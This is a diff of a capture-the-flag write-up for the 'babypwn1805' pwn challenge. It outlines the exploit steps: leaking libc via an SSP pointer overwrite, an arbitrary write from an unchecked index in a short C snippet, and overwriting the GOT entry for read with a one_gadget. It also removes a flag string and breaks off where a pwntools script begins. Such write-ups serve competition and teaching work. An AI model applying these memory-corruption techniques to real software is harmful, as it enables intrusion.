@@ -1,9 +1,16 @@
-### babypwn1805 - pwn
+# babypwn1805 - pwn
+## Team: BFS
+## Ranking: 22
 * Overwrite the pointer of program name, and trigger `SSP` -> leak information.
 * Get serveral `libc`.
+```c
+    char asdf[1024];
+    long long index = 0;
+    read(0, asdf+index, 8);
+```
+* `asdf+index` -> write everywhere.
 * Overwite `GOT read` with `onegadget` -> with probability 1/16 (correct libc).
 * `/opt/ctf/babypwn/home/flag`.
-* `OOO{to_know_the_libc_you_must_become_the_libc}`
 ```python
 #!/usr/bin/env python
 from pwn import *
